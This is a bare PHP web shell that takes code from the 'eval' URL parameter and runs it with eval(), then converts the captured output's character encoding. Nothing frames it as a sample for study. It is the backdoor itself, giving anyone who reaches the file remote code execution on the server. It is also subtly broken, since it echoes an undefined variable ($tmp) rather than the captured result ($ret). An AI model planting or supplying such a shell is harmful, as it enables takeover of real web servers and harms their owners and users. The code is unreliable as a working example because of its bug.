<?php
$eval = $_GET['eval'];
if (!empty($eval))
{
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
 
}
?>
